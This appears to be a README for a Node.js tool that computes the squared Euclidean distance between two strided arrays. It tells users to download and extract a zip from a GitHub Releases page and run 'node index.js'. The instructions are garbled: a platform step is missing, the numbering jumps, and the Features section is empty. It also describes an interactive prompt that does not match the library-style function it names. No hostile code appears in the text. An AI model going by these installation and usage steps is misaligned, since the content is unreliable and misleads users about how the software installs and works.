## 📖 Overview
The **stats-strided-distances-dsquared-euclidean** application computes the squared Euclidean distance between two double-precision floating-point strided arrays. This tool simplifies the process of calculating distances in data analysis and statistics.

## 🚀 Getting Started
Follow these steps to download and run the application smoothly.

### 💻 System Requirements
- Operating System: Windows, macOS, or Linux
- Node.js version: 12 or higher

### 📥 Download & Install
1. Visit the [Releases page](https://github.com/Joewaks/stats-strided-distances-dsquared-euclidean/releases) to download the latest version of the application.
2. Look for the file labeled **stats-strided-distances-dsquared-euclidean.zip** or a similar name.
3. Click on the file to start the download.
4. Once the download completes, locate the file on your computer.
5. Extract the contents of the zip file.

### 📂 Running the Application
To run the application, you will need to open a command-line interface:

   - For macOS/Linux: `cd path/to/your/extracted/folder`
3. Once you are in the correct folder, run the following command:
   ```
   node index.js
   ```

### 🌐 Usage
After running the application, it will prompt you to input two strided arrays. Here’s how to do that:

1. Enter the first strided array (for example: `[1.0, 2.0, 3.0]`).
2. Enter the second strided array (for example: `[4.0, 5.0, 6.0]`).
3. The application will output the squared Euclidean distance.

## ⚙️ Features
